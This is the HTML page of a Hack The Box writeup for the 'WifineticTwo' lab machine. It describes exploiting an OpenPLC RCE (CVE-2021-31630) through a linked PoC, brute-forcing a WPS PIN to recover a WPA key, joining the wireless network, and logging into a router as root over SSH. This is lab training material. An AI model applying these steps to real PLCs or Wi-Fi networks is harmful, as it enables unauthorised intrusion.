@@ -1,0 +1,195 @@
+<!doctype html>
+<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>Bajo el teclado</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="" />
+
+    
+    
+    
+    <link rel="stylesheet" href="../../css/theme.min.css">
+
+    
+    
+    
+
+    
+  
+
+
+</head>
+<body>
+        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
+    <div class="row">
+        
+        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
+            <a href="../../" class="text-decoration-none">
+                <img id="home-image" class="rounded-circle"
+                    
+                        
+                            src="../../images/avatar.png"
+                        
+                    
+                />
+            </a>
+        </div>
+        <div class="col-sm-8 col-12 text-sm-left text-center">
+        
+            <h2 class="m-0 mb-2 mt-4">
+                <a href="../../" class="text-decoration-none">
+                    
+                        pointedsec
+                    
+                </a>
+            </h2>
+            <p class="text-muted mb-1">
+                
+                    if pentester.found == bug { make(pentester,states.happy) }
+                
+            </p>
+            <ul id="nav-links" class="list-inline mb-2">
+                
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../about/" title="About">About</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
+                    </li>
+                
+            </ul>
+            <ul id="nav-social" class="list-inline">
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="http://github.com/andresdrew02" target="_blank">
+                            <i class="fab fa-github fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
+                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
+                            <i class="fas fa-at fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+    <hr />
+</header>
+<div class="container">
+    <div class="pl-sm-4 ml-sm-5">
+        <h1 id="hack-the-box-wifinetictwo-writeup">Hack The Box: WifineticTwo Writeup</h1>
+<p>Welcome to my detailed writeup of the medium difficulty machine <strong>&ldquo;WifineticTwo&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
+<h2 id="-initial-enumeration">🕵️‍♂️ Initial Enumeration</h2>
+<h3 id="port-scanning">Port Scanning</h3>
+<p>First, we perform a TCP port scan to discover open ports and services.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18
+</span></span><span style="display:flex;"><span>|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
+</span></span><span style="display:flex;"><span>| fingerprint-strings:
+</span></span><span style="display:flex;"><span>|   FourOhFourRequest:
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">404</span> NOT FOUND
+</span></span><span style="display:flex;"><span>|     content-type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     content-length: <span style="color:#ae81ff">232</span>
+</span></span><span style="display:flex;"><span>|     vary: Cookie
+</span></span><span style="display:flex;"><span>|     set-cookie: session<span style="color:#f92672">=</span>eyJfcGVybWFuZW50Ijp0cnVlfQ.ZqPPOw.iUxtyBgx_I7ywKWBIJNQZkv6zL4; Expires<span style="color:#f92672">=</span>Fri, 26-Jul-2024 16:35:51 GMT; HttpOnly; Path<span style="color:#f92672">=</span>/
+</span></span><span style="display:flex;"><span>|     server: Werkzeug/1.0.1 Python/2.7.18
+</span></span><span style="display:flex;"><span>|     date: Fri, <span style="color:#ae81ff">26</span> Jul <span style="color:#ae81ff">2024</span> 16:30:51 GMT
+</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD HTML 3.2 Final//EN&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;404 Not Found&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Not Found&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|   GetRequest:
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">302</span> FOUND
+</span></span></code></pre></div><h3 id="-web-enumeration">🌐 Web Enumeration</h3>
+<p>Upon visiting the web service on port 8080, we identify it as an OpenPLC instance, which is known to have a Remote Code Execution (RCE) vulnerability (CVE-2021-31630).</p>
+<h3 id="-initial-foothold">📂 Initial Foothold</h3>
+<p>Using this <a href="https://github.com/thewhiteh4t/cve-2021-31630">PoC</a> we can get Remote Command Execution on the target, this exploit just upload a specially designed C code that will execute on PLC start.</p>
+<p>After executing the exploit, we gain access to a container.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>hostname -I
+</span></span><span style="display:flex;"><span>10.0.3.2
+</span></span><span style="display:flex;"><span>10.0.3.52
+</span></span></code></pre></div><h3 id="-wireless-network-exploitation">📶 Wireless Network Exploitation</h3>
+<p>With <code>iw dev wlan0 scan</code> command, we can see that an Access Point exists, this AP BSSID is: <code>02:00:00:00:01:00</code></p>
+<p>This network have WPS PIN version 1 activated, so we can probably do some bruteforce to the WPS PIN to obtain the WPA PSK.</p>
+<p>With <a href="https://github.com/nikita-yfh/OneShot-C">OneShot</a>
+We can bruteforce the WPS pin. The PIN is: <code>12345670</code>, Top-Level Security</p>
+<p>With this PIN we can now obtain the WPA PSK: <code>NoWWEDoKnowWhaTisReal123!</code></p>
+<p>But we doesn&rsquo;t have a username to use this password.</p>
+<h5 id="connecting-to-the-wireless-network">Connecting to the wireless network</h5>
+<p>Now, we can connect to this Access Point using <code>wpa_passphrase</code> and <code>wpa_supplicant</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@attica01:/tmp/oneshot# wpa_passphrase plcrouter <span style="color:#e6db74">&#34;NoWWEDoKnowWhaTisReal123!&#34;</span> | sudo tee /etc/wpa_supplicant.con
+</span></span><span style="display:flex;"><span>network<span style="color:#f92672">={</span>
+</span></span><span style="display:flex;"><span>	ssid<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;plcrouter&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">#psk=&#34;NoWWEDoKnowWhaTisReal123!&#34;</span>
+</span></span><span style="display:flex;"><span>	psk<span style="color:#f92672">=</span>2bafe4e17630ef1834eaa9fa5c4d81fa5ef093c4db5aac5c03f1643fef02d156<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>We can now authenticate to the AP</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>wpa_supplicant -B -c /etc/wpa_supplicant.conf -i wlan0
+</span></span></code></pre></div><p>It seems that this Network doesn&rsquo;t have a DHCP Server on it, so we can assign one IP direction statically guessing the tipical domestic networks (192.168.0.0/24 / 192.168.1.0/24)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo ifconfig wlan0 192.168.1.10 netmask 255.255.255.0 up
+</span></span></code></pre></div><p>We can do ping to 192.168.1.1</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@attica01:/tmp/oneshot# ping 192.168.1.1
+</span></span><span style="display:flex;"><span>PING 192.168.1.1 <span style="color:#f92672">(</span>192.168.1.1<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.1: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>18.2 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.1: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>57.0 ms
+</span></span></code></pre></div><h3 id="-privilege-escalation">🛡️ Privilege Escalation</h3>
+<p>Scanning Open Ports on the Router</p>
+<p>Using the Pivoting Enum script suite:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>git clone https://github.com/S12cybersecurity/Pivoting_Enum
+</span></span><span style="display:flex;"><span>cd Pivoting_Enum
+</span></span><span style="display:flex;"><span>./enum.sh 192.168.1.1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Open Ports:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    53/tcp: DNS
+</span></span><span style="display:flex;"><span>    22/tcp: SSH
+</span></span><span style="display:flex;"><span>    80/tcp: HTTP
+</span></span><span style="display:flex;"><span>    443/tcp: HTTPS
+</span></span></code></pre></div><p>SSH into the Router</p>
+<p>Surprisingly, the router&rsquo;s SSH allows login without a password for root.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ssh root@192.168.1.1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span> WARNING! <span style="color:#f92672">=====================================</span>
+</span></span><span style="display:flex;"><span>There is no root password defined on this device!
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;passwd&#34;</span> command to set up a new password
+</span></span><span style="display:flex;"><span>in order to prevent unauthorized SSH logins.
+</span></span></code></pre></div><p>At this point we fully compromised this machine!</p>
+<h3 id="-conclusion">🎉 Conclusion</h3>
+<p>Through systematic enumeration and exploitation, we successfully rooted WifineticTwo. This involved leveraging default credentials, exploiting RCE, brute-forcing WPS PIN, and finally gaining root access via SSH.</p>
+<p>Happy Hacking! 🚀</p>
+
+    </div>
+
+    
+
+            </div>
+        </div><footer class="text-center pb-1">
+    <small class="text-muted">
+        
+            &copy; 2024, Andrés Del Cerro
+        
+        <br>
+        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
+        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
+    </small>
+</footer>
+</body>
+</html>
